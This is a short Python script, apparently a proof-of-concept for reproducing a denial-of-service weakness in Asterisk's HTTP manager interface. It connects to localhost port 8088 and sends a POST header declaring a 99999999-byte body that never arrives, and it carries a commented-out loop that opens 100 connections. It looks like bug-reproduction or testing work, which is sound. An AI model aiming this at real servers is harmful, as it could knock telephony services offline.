#!/usr/bin/python

import socket
import sys

arr = []
s = None
#for i in range(100):
#  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#  s.connect( ("localhost", 8088) )
#  arr.append(s)
#raw_input("exit")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
raw_input("Press Enter to connect.. ")
s.connect( ("localhost", 8088) )

header = ("POST /asterisk/manager HTTP/1.0\r\n"+
          "Host: localhost\r\n"+
          "Content-length: 99999999\r\n"+
          "\r\n")
raw_input("Press Enter to send header .. ")
s.send(header)
